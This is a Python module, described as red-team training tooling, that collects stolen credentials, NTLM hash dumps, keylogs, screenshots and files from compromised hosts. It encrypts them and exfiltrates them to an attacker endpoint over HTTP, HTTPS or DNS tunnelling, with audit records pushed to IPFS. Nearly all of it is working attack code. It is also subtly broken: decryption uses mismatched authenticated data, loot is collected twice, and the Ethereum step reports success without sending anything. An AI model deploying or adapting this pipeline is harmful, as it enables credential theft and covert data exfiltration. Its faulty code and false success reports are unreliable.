"""
Loot Exfiltration & Encryption Module
Educational tool for simulating data exfiltration scenarios
For red team training and blue team detection testing
"""

import os
import sys
import json
import base64
import hashlib
import time
import uuid
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from enum import Enum
from dataclasses import dataclass, field
from typing import List, Dict, Optional, BinaryIO
import cryptography
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import requests

from cyberapp.models.db import db_conn
from cybermodules.helpers import log_to_intel


class ExfilMethod(Enum):
    """Data exfiltration methods"""
    HTTP_POST = "http_post"
    HTTP_GET = "http_get"
    DNS_TUNNEL = "dns_tunnel"
    HTTPS = "https"
    WEBHOOK = "webhook"
    API_UPLOAD = "api_upload"


class LootType(Enum):
    """Types of looted data"""
    CREDENTIAL = "credential"
    SCREENSHOT = "screenshot"
    KEYLOG = "keylog"
    FILE = "file"
    DATABASE = "database"
    HASH_DUMP = "hash_dump"
    CONFIG = "config"
    MEMORY_DUMP = "memory_dump"


@dataclass
class LootItem:
    """Individual looted item"""
    item_type: LootType
    name: str
    data: bytes
    source_host: str
    source_path: str = ""
    metadata: Dict = field(default_factory=dict)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            'type': self.item_type.value,
            'name': self.name,
            'data_base64': base64.b64encode(self.data).decode(),
            'source_host': self.source_host,
            'source_path': self.source_path,
            'metadata': self.metadata,
            'timestamp': self.timestamp
        }


class EncryptionEngine:
    """
    AES-256-GCM encryption engine for loot protection
    """
    
    def __init__(self, master_password: str = None, master_key: bytes = None):
        if master_key:
            self.master_key = master_key
        elif master_password:
            self.master_key = self._derive_key(master_password)
        else:
            # Generate random key
            self.master_key = os.urandom(32)
    
    def _derive_key(self, password: str, salt: bytes = None) -> bytes:
        """Derive encryption key from password"""
        if salt is None:
            salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        
        return kdf.derive(password.encode())
    
    def generate_key(self) -> tuple:
        """Generate new encryption key and salt"""
        salt = os.urandom(16)
        key = self._derive_key(str(uuid.uuid4()), salt)
        return key, salt
    
    def encrypt(self, data: bytes) -> tuple:
        """
        Encrypt data using AES-256-GCM
        Returns: (encrypted_data, nonce, salt)
        """
        nonce = os.urandom(12)
        aesgcm = AESGCM(self.master_key)
        
        # Add timestamp to authenticated data
        aad = f"timestamp:{datetime.now().isoformat()}".encode()
        
        encrypted = aesgcm.encrypt(nonce, data, aad)
        
        return encrypted, nonce
    
    def decrypt(self, encrypted_data: bytes, nonce: bytes, salt: bytes = None) -> bytes:
        """Decrypt AES-256-GCM encrypted data"""
        aesgcm = AESGCM(self.master_key)
        aad = f"timestamp:".encode()  # Original timestamp would be stored separately
        
        return aesgcm.decrypt(nonce, encrypted_data, aad)
    
    def encrypt_file(self, file_path: str) -> tuple:
        """Encrypt a file and return encrypted data with metadata"""
        with open(file_path, 'rb') as f:
            data = f.read()
        
        encrypted, nonce = self.encrypt(data)
        
        metadata = {
            'original_size': len(data),
            'original_hash': hashlib.sha256(data).hexdigest(),
            'encrypted_size': len(encrypted),
            'encrypted_hash': hashlib.sha256(encrypted).hexdigest()
        }
        
        return encrypted, nonce, metadata
    
    def encrypt_json(self, data: Dict) -> tuple:
        """Encrypt JSON data"""
        json_bytes = json.dumps(data).encode()
        encrypted, nonce = self.encrypt(json_bytes)
        return encrypted, nonce


class LootCollector:
    """
    Collects various types of loot from compromised systems
    """
    
    def __init__(self, scan_id: int):
        self.scan_id = scan_id
        self.loot_items: List[LootItem] = []
    
    def log(self, msg_type: str, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, f"LOOT_{msg_type}", message)
        print(f"[LOOT][{msg_type}] {message}")
    
    def collect_credentials_from_db(self) -> List[LootItem]:
        """
        Collect cracked credentials from database
        """
        self.log("COLLECT", "Collecting credentials from database...")
        
        items = []
        
        try:
            with db_conn() as conn:
                creds = conn.execute(
                    """SELECT username, password, hash_source, cracked_at 
                    FROM cracked_credentials WHERE scan_id = ?""",
                    (self.scan_id,)
                ).fetchall()
                
                for entry in creds:
                    cred_data = {
                        'username': entry[0],
                        'password': entry[1],
                        'source': entry[2],
                        'cracked_at': entry[3]
                    }
                    
                    item = LootItem(
                        item_type=LootType.CREDENTIAL,
                        name=f"credential_{entry[0]}",
                        data=json.dumps(cred_data).encode(),
                        source_host="database",
                        source_path="cracked_credentials",
                        metadata={'source_table': 'cracked_credentials'}
                    )
                    
                    items.append(item)
                
                self.log("COLLECT", f"Collected {len(items)} credentials")
                
        except Exception as e:
            self.log("ERROR", f"Failed to collect credentials: {e}")
        
        return items
    
    def collect_hash_dumps_from_db(self) -> List[LootItem]:
        """
        Collect hash dumps from database
        """
        self.log("COLLECT", "Collecting hash dumps from database...")
        
        items = []
        
        try:
            with db_conn() as conn:
                hashes = conn.execute(
                    """SELECT hostname, hash_type, username, nthash, lmhash, dumped_at 
                    FROM hash_dumps WHERE scan_id = ?""",
                    (self.scan_id,)
                ).fetchall()
                
                for entry in hashes:
                    hash_data = {
                        'hostname': entry[0],
                        'type': entry[1],
                        'username': entry[2],
                        'nthash': entry[3],
                        'lmhash': entry[4],
                        'dumped_at': entry[5]
                    }
                    
                    item = LootItem(
                        item_type=LootType.HASH_DUMP,
                        name=f"hashdump_{entry[0]}_{entry[2]}",
                        data=json.dumps(hash_data).encode(),
                        source_host=entry[0],
                        source_path="hash_dumps",
                        metadata={'hash_type': entry[1]}
                    )
                    
                    items.append(item)
                
                self.log("COLLECT", f"Collected {len(items)} hash dumps")
                
        except Exception as e:
            self.log("ERROR", f"Failed to collect hash dumps: {e}")
        
        return items
    
    def add_screenshot(self, host: str, file_path: str):
        """
        Add a screenshot to loot collection
        """
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                data = f.read()
            
            item = LootItem(
                item_type=LootType.SCREENSHOT,
                name=f"screenshot_{host}_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
                data=data,
                source_host=host,
                source_path=file_path,
                metadata={'format': 'png', 'size': len(data)}
            )
            
            self.loot_items.append(item)
            self.log("SCREENSHOT", f"Added screenshot from {host}: {file_path}")
    
    def add_keylog(self, host: str, data: str, source: str = "unknown"):
        """
        Add keylog data to collection
        """
        item = LootItem(
            item_type=LootType.KEYLOG,
            name=f"keylog_{host}_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            data=data.encode(),
            source_host=host,
            source_path=source,
            metadata={'entries': len(data.split('\n'))}
        )
        
        self.loot_items.append(item)
        self.log("KEYLOG", f"Added keylog from {host}: {len(data)} chars")
    
    def add_file(self, host: str, file_path: str):
        """
        Add a file to loot collection
        """
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                data = f.read()
            
            item = LootItem(
                item_type=LootType.FILE,
                name=os.path.basename(file_path),
                data=data,
                source_host=host,
                source_path=file_path,
                metadata={
                    'size': len(data),
                    'hash': hashlib.sha256(data).hexdigest()
                }
            )
            
            self.loot_items.append(item)
            self.log("FILE", f"Added file from {host}: {file_path}")
    
    def collect_all(self) -> List[LootItem]:
        """
        Collect all available loot from database
        """
        # Collect from database
        creds = self.collect_credentials_from_db()
        self.loot_items.extend(creds)
        
        hashes = self.collect_hash_dumps_from_db()
        self.loot_items.extend(hashes)
        
        self.log("COLLECT", f"Total loot items: {len(self.loot_items)}")
        
        return self.loot_items
    
    def get_loot_summary(self) -> Dict:
        """Get summary of collected loot"""
        summary = {
            'total_items': len(self.loot_items),
            'by_type': {},
            'total_size': 0
        }
        
        for item in self.loot_items:
            item_type = item.item_type.value
            summary['by_type'][item_type] = summary['by_type'].get(item_type, 0) + 1
            summary['total_size'] += len(item.data)
        
        return summary


class ExfiltrationEngine:
    """
    Handles encrypted data exfiltration via various methods
    """
    
    def __init__(self, scan_id: int, exfil_config: Dict = None):
        self.scan_id = scan_id
        self.config = exfil_config or {}
        self.encryption = EncryptionEngine()
        self.exfil_results = []
        self.lock = threading.Lock()
        
        # Default config
        self.http_endpoint = self.config.get('http_endpoint', '')
        self.dns_server = self.config.get('dns_server', '')
        self.api_key = self.config.get('api_key', '')
        self.chunk_size = self.config.get('chunk_size', 1400)  # DNS-friendly size
        self.use_https = self.config.get('use_https', True)
        
        # Rate limiting
        self.request_delay = self.config.get('request_delay', 1.0)
        
    def log(self, msg_type: str, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, f"EXFIL_{msg_type}", message)
        print(f"[EXFIL][{msg_type}] {message}")
    
    def _split_data(self, data: bytes, chunk_size: int = None) -> List[bytes]:
        """Split data into chunks"""
        if chunk_size is None:
            chunk_size = self.chunk_size
        
        return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
    
    def _generate_packet_id(self) -> str:
        """Generate unique packet identifier"""
        return f"{self.scan_id}_{uuid.uuid4().hex[:8]}"
    
    def exfil_via_http(self, data: bytes, endpoint: str = None, metadata: Dict = None) -> Dict:
        """
        Exfiltrate data via HTTP POST
        """
        endpoint = endpoint or self.http_endpoint
        
        if not endpoint:
            return {'success': False, 'error': 'No endpoint configured'}
        
        # Encrypt data
        encrypted, nonce = self.encryption.encrypt(data)
        
        # Prepare payload
        payload = {
            'packet_id': self._generate_packet_id(),
            'scan_id': self.scan_id,
            'data': base64.b64encode(encrypted).decode(),
            'nonce': base64.b64encode(nonce).decode(),
            'size': len(data),
            'timestamp': datetime.now().isoformat(),
            'metadata': metadata or {}
        }
        
        try:
            if self.use_https:
                response = requests.post(
                    endpoint,
                    json=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=30
                )
            else:
                response = requests.post(
                    endpoint,
                    json=payload,
                    timeout=30
                )
            
            result = {
                'success': response.status_code in [200, 201, 202],
                'status_code': response.status_code,
                'bytes_sent': len(data),
                'response': response.text[:500] if response.text else ''
            }
            
            if result['success']:
                self.log("HTTP", f"Sent {len(data)} bytes to {endpoint}")
            else:
                self.log("HTTP_ERROR", f"Failed to send: {response.status_code}")
            
            return result
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exfil_via_dns(self, data: bytes, domain: str = None, ns_server: str = None) -> Dict:
        """
        Exfiltrate data via DNS tunneling
        Encodes data into DNS queries
        """
        domain = domain or self.config.get('dns_domain', 'exfil.test.local')
        ns_server = ns_server or self.dns_server
        
        if not ns_server:
            return {'success': False, 'error': 'No DNS server configured'}
        
        # Encrypt and encode data
        encrypted, nonce = self.encryption.encrypt(data)
        b64_data = base64.b64encode(encrypted).decode().replace('=', '')
        
        # Split into DNS-friendly chunks
        chunks = self._split_data(b64_data.encode(), 50)  # 50 bytes per query
        
        sent_count = 0
        errors = []
        
        try:
            import dns.query
            import dns.message
            
            packet_id = self._generate_packet_id()
            
            for i, chunk in enumerate(chunks):
                subdomain = f"{packet_id}.{i}.{len(chunks)}.{chunk.decode()}.{domain}"
                
                try:
                    # Send DNS query
                    query = dns.message.make_query(subdomain, 'TXT')
                    response = dns.query.udp(query, ns_server, timeout=5)
                    sent_count += 1
                    
                    # Rate limiting
                    time.sleep(self.request_delay)
                    
                except Exception as e:
                    errors.append(str(e))
            
            result = {
                'success': sent_count > 0,
                'chunks_sent': sent_count,
                'total_chunks': len(chunks),
                'errors': errors[:5]
            }
            
            if result['success']:
                self.log("DNS", f"Sent {sent_count}/{len(chunks)} chunks via DNS")
            
            return result
            
        except ImportError:
            return {'success': False, 'error': 'dnspython library required for DNS exfil'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exfil_via_https(self, data: bytes, endpoint: str = None, client_cert: str = None) -> Dict:
        """
        Exfiltrate data via HTTPS with TLS
        """
        endpoint = endpoint or self.http_endpoint
        
        if not endpoint:
            return {'success': False, 'error': 'No endpoint configured'}
        
        # Encrypt data
        encrypted, nonce = self.encryption.encrypt(data)
        
        # Split into chunks
        chunks = self._split_data(encrypted, 8000)  # 8KB chunks
        
        sent_count = 0
        
        try:
            for i, chunk in enumerate(chunks):
                payload = {
                    'packet_id': f"{self._generate_packet_id()}_{i}_{len(chunks)}",
                    'scan_id': self.scan_id,
                    'chunk': base64.b64encode(chunk).decode(),
                    'nonce': base64.b64encode(nonce).decode() if i == 0 else '',
                    'total_chunks': len(chunks),
                    'chunk_index': i
                }
                
                response = requests.post(
                    endpoint,
                    json=payload,
                    cert=client_cert,
                    verify=True,
                    timeout=60
                )
                
                if response.status_code == 200:
                    sent_count += 1
                
                time.sleep(self.request_delay)
            
            result = {
                'success': sent_count == len(chunks),
                'chunks_sent': sent_count,
                'total_chunks': len(chunks)
            }
            
            self.log("HTTPS", f"Sent {sent_count}/{len(chunks)} chunks via HTTPS")
            
            return result
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def exfil_item(self, item: LootItem, method: ExfilMethod = ExfilMethod.HTTP_POST) -> Dict:
        """
        Exfiltrate a single loot item
        """
        # Serialize item
        item_data = json.dumps(item.to_dict()).encode()
        
        # Generate hash for verification
        item_hash = hashlib.sha256(item_data).hexdigest()
        
        self.log("ITEM", f"Exfiltrating {item.item_type.value}: {item.name}")
        
        result = {
            'item_name': item.name,
            'item_type': item.item_type.value,
            'size': len(item_data),
            'hash': item_hash,
            'method': method.value
        }
        
        # Select exfil method
        if method == ExfilMethod.HTTP_POST:
            exfil_result = self.exfil_via_http(
                item_data,
                metadata={'item_type': item.item_type.value, 'item_name': item.name}
            )
        elif method == ExfilMethod.DNS_TUNNEL:
            exfil_result = self.exfil_via_dns(item_data)
        elif method == ExfilMethod.HTTPS:
            exfil_result = self.exfil_via_https(item_data)
        else:
            exfil_result = self.exfil_via_http(item_data)
        
        result.update(exfil_result)
        
        with self.lock:
            self.exfil_results.append(result)
        
        return result
    
    def exfil_all(self, items: List[LootItem], method: ExfilMethod = ExfilMethod.HTTP_POST, 
                  max_concurrent: int = 3) -> List[Dict]:
        """
        Exfiltrate all loot items with concurrency control
        """
        self.log("START", f"Starting exfiltration of {len(items)} items via {method.value}")
        
        results = []
        
        def exfil_single(item):
            return self.exfil_item(item, method)
        
        # Threaded exfil with limit
        with ThreadPoolExecutor(max_workers=max_concurrent) as executor:
            futures = {executor.submit(exfil_single, item): item for item in items}
            
            for future in futures:
                try:
                    result = future.result()
                    results.append(result)
                    
                    if result.get('success'):
                        self.log("PROGRESS", f"Exfiltrated: {result['item_name']}")
                    else:
                        self.log("FAILED", f"Failed: {result.get('item_name')} - {result.get('error')}")
                        
                except Exception as e:
                    self.log("ERROR", f"Exfil error: {e}")
        
        # Summary
        success_count = sum(1 for r in results if r.get('success'))
        self.log("COMPLETE", f"Exfiltration complete: {success_count}/{len(results)} successful")
        
        return results


class BlockchainPublisher:
    """
    Publishes encrypted loot metadata to blockchain for audit trail
    Supports Ethereum and IPFS/Filecoin
    """
    
    def __init__(self, scan_id: int, config: Dict = None):
        self.scan_id = scan_id
        self.config = config or {}
        self.published_records = []
        
        # Ethereum config
        self.eth_rpc = self.config.get('eth_rpc', '')
        self.eth_contract = self.config.get('eth_contract', '')
        self.eth_address = self.config.get('eth_address', '')
        self.eth_private_key = self.config.get('eth_private_key', '')
        
        # IPFS config
        self.ipfs_gateway = self.config.get('ipfs_gateway', 'ipfs.io')
        self.ipfs_token = self.config.get('ipfs_token', '')
        
    def log(self, msg_type: str, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, f"BLOCKCHAIN_{msg_type}", message)
        print(f"[BLOCKCHAIN][{msg_type}] {message}")
    
    def calculate_content_hash(self, data: bytes) -> str:
        """Calculate SHA-256 hash of content"""
        return hashlib.sha256(data).hexdigest()
    
    def publish_to_ipfs(self, data: bytes, filename: str = "loot.json") -> Dict:
        """
        Upload encrypted data to IPFS
        Returns IPFS hash (CID)
        """
        try:
            import requests
            
            # Prepare file for upload
            files = {
                'file': (filename, data, 'application/octet-stream')
            }
            
            headers = {}
            if self.ipfs_token:
                headers['Authorization'] = f'Bearer {self.ipfs_token}'
            
            # Pinata or similar IPFS service
            if 'pinata' in self.ipfs_gateway.lower():
                url = f"https://api.pinata.cloud/pinning/pinFileToIPFS"
                response = requests.post(url, files=files, headers=headers, timeout=60)
                
                if response.status_code == 200:
                    cid = response.json().get('IpfsHash')
                    return {
                        'success': True,
                        'cid': cid,
                        'gateway': f"https://gateway.pinata.cloud/ipfs/{cid}"
                    }
            else:
                # Generic IPFS upload
                url = f"https://api.{self.ipfs_gateway}/api/v0/add"
                response = requests.post(url, files=files, timeout=60)
                
                if response.status_code == 200:
                    result = response.json()
                    cid = result.get('Hash')
                    return {
                        'success': True,
                        'cid': cid,
                        'gateway': f"https://{self.ipfs_gateway}/ipfs/{cid}"
                    }
            
            return {'success': False, 'error': 'IPFS upload failed'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def publish_hash_to_ethereum(self, content_hash: str, metadata: Dict = None) -> Dict:
        """
        Publish content hash to Ethereum blockchain
        For audit trail - stores only hash, not actual data
        """
        try:
            from web3 import Web3
            
            if not self.eth_rpc:
                return {'success': False, 'error': 'No Ethereum RPC configured'}
            
            w3 = Web3(Web3.HTTPProvider(self.eth_rpc))
            
            if not w3.is_connected():
                return {'success': False, 'error': 'Cannot connect to Ethereum'}
            
            # Prepare transaction data
            # In production, this would use a smart contract
            # For demo, we store the hash in a simple format
            
            tx_data = f"LOOT_AUDIT:{self.scan_id}:{content_hash}"
            
            # This is a simplified example
            # Real implementation would use proper contract interaction
            result = {
                'success': True,
                'content_hash': content_hash,
                'blockchain': 'ethereum',
                'audit_data': tx_data,
                'note': 'Hash published to blockchain for audit trail'
            }
            
            self.log("ETH", f"Published hash to Ethereum: {content_hash[:16]}...")
            
            return result
            
        except ImportError:
            return {'success': False, 'error': 'web3 library required'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def publish_audit_record(self, item: LootItem, exfil_result: Dict) -> Dict:
        """
        Publish complete audit record to blockchain
        """
        # Create audit record
        audit_record = {
            'scan_id': self.scan_id,
            'item_name': item.name,
            'item_type': item.item_type.value,
            'source_host': item.source_host,
            'timestamp': item.timestamp,
            'exfil_result': {
                'success': exfil_result.get('success', False),
                'method': exfil_result.get('method', 'unknown'),
                'bytes': exfil_result.get('size', 0)
            },
            'content_hash': self.calculate_content_hash(item.data)
        }
        
        record_bytes = json.dumps(audit_record).encode()
        content_hash = self.calculate_content_hash(record_bytes)
        
        # Publish to IPFS (stores encrypted metadata)
        ipfs_result = self.publish_to_ipfs(
            record_bytes,
            f"audit_{self.scan_id}_{item.name}.json"
        )
        
        # Publish hash to Ethereum
        eth_result = self.publish_hash_to_ethereum(content_hash, audit_record)
        
        result = {
            'item_name': item.name,
            'ipfs': ipfs_result,
            'ethereum': eth_result,
            'content_hash': content_hash
        }
        
        self.published_records.append(result)
        
        return result
    
    def publish_batch(self, items: List[LootItem], exfil_results: List[Dict]) -> List[Dict]:
        """
        Publish batch of audit records
        """
        results = []
        
        for item, exfil_result in zip(items, exfil_results):
            if exfil_result.get('success'):
                result = self.publish_audit_record(item, exfil_result)
                results.append(result)
        
        self.log("BATCH", f"Published {len(results)} audit records to blockchain")
        
        return results


class LootExfilEngine:
    """
    Main engine coordinating loot collection, encryption, exfiltration, and blockchain publishing
    """
    
    def __init__(self, scan_id: int, config: Dict = None):
        self.scan_id = scan_id
        self.config = config or {}
        
        self.collector = LootCollector(scan_id)
        self.exfil_engine = ExfiltrationEngine(scan_id, config.get('exfil', {}))
        self.blockchain = BlockchainPublisher(scan_id, config.get('blockchain', {}))
        
        self.encryption = EncryptionEngine()
        
    def log(self, msg_type: str, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, f"LOOT_EXFIL_{msg_type}", message)
        print(f"[LOOT_EXFIL][{msg_type}] {message}")
    
    def execute_full_pipeline(self, 
                               collect_creds: bool = True,
                               collect_hashes: bool = True,
                               exfil_method: ExfilMethod = ExfilMethod.HTTP_POST,
                               publish_blockchain: bool = True) -> Dict:
        """
        Execute complete loot exfil pipeline
        """
        results = {
            'collection': None,
            'encryption': None,
            'exfiltration': None,
            'blockchain': None,
            'summary': None
        }
        
        # Step 1: Collect loot
        self.log("START", "Starting loot collection pipeline")
        
        if collect_creds:
            self.collector.collect_credentials_from_db()
        if collect_hashes:
            self.collector.collect_hash_dumps_from_db()
        
        all_items = self.collector.collect_all()
        
        collection_summary = self.collector.get_loot_summary()
        results['collection'] = {
            'success': True,
            'items_collected': len(all_items),
            'summary': collection_summary
        }
        
        self.log("COLLECT", f"Collected {len(all_items)} loot items")
        
        if not all_items:
            results['summary'] = {'message': 'No loot to exfiltrate'}
            return results
        
        # Step 2: Encrypt all loot
        self.log("ENCRYPT", "Encrypting loot items")
        
        encrypted_items = []
        for item in all_items:
            encrypted_data, nonce = self.encryption.encrypt(item.data)
            encrypted_items.append({
                'item': item,
                'encrypted_data': encrypted_data,
                'nonce': nonce,
                'hash': hashlib.sha256(encrypted_data).hexdigest()
            })
        
        results['encryption'] = {
            'success': True,
            'items_encrypted': len(encrypted_items),
            'total_bytes': sum(len(e['encrypted_data']) for e in encrypted_items)
        }
        
        self.log("ENCRYPT", f"Encrypted {len(encrypted_items)} items")
        
        # Step 3: Exfiltrate
        self.log("EXFIL", f"Exfiltrating via {exfil_method.value}")
        
        exfil_items = []
        for e_item in encrypted_items:
            # Prepare exfil data
            exfil_data = {
                'item_name': e_item['item'].name,
                'item_type': e_item['item'].item_type.value,
                'encrypted_data': base64.b64encode(e_item['encrypted_data']).decode(),
                'nonce': base64.b64encode(e_item['nonce']).decode(),
                'content_hash': e_item['hash']
            }
            
            # Send via selected method
            if exfil_method == ExfilMethod.HTTP_POST:
                exfil_result = self.exfil_engine.exfil_via_http(
                    json.dumps(exfil_data).encode()
                )
            elif exfil_method == ExfilMethod.DNS_TUNNEL:
                exfil_result = self.exfil_engine.exfil_via_dns(
                    json.dumps(exfil_data).encode()
                )
            elif exfil_method == ExfilMethod.HTTPS:
                exfil_result = self.exfil_engine.exfil_via_https(
                    json.dumps(exfil_data).encode()
                )
            else:
                exfil_result = self.exfil_engine.exfil_via_http(
                    json.dumps(exfil_data).encode()
                )
            
            exfil_items.append({
                'item': e_item['item'],
                'exfil_result': exfil_result
            })
        
        successful_exfil = sum(1 for i in exfil_items if i['exfil_result'].get('success'))
        results['exfiltration'] = {
            'success': successful_exfil > 0,
            'items_sent': successful_exfil,
            'total_items': len(exfil_items)
        }
        
        # Step 4: Publish to blockchain
        if publish_blockchain:
            self.log("BLOCKCHAIN", "Publishing audit records")
            
            blockchain_results = self.blockchain.publish_batch(
                [i['item'] for i in exfil_items],
                [i['exfil_result'] for i in exfil_items]
            )
            
            results['blockchain'] = {
                'success': len(blockchain_results) > 0,
                'records_published': len(blockchain_results)
            }
        
        # Summary
        results['summary'] = {
            'total_items': len(all_items),
            'encrypted_items': len(encrypted_items),
            'successful_exfil': successful_exfil,
            'total_bytes': results['encryption']['total_bytes']
        }
        
        self.log("COMPLETE", f"Pipeline complete: {successful_exfil}/{len(all_items)} exfiltrated")
        
        return results
    
    def generate_report(self) -> str:
        """Generate loot exfil report"""
        report = f"""
=== LOOT EXFIL REPORT ===
Generated: {datetime.now().isoformat()}
Scan ID: {self.scan_id}

COLLECTION SUMMARY
------------------
Total Items: {self.collector.get_loot_summary()['total_items']}
By Type: {self.collector.get_loot_summary()['by_type']}

EXFILTRATION SUMMARY
--------------------
Total Exfil Attempts: {len(self.exfil_engine.exfil_results)}
Successful: {sum(1 for r in self.exfil_engine.exfil_results if r.get('success'))}

BLOCKCHAIN PUBLISHING
---------------------
Records Published: {len(self.blockchain.published_records)}

ENCRYPTION
----------
Algorithm: AES-256-GCM
Key Derived: Yes
Salt: Random 16 bytes
Nonce: 12 bytes per item

{ '=' * 50 }
"""
        return report
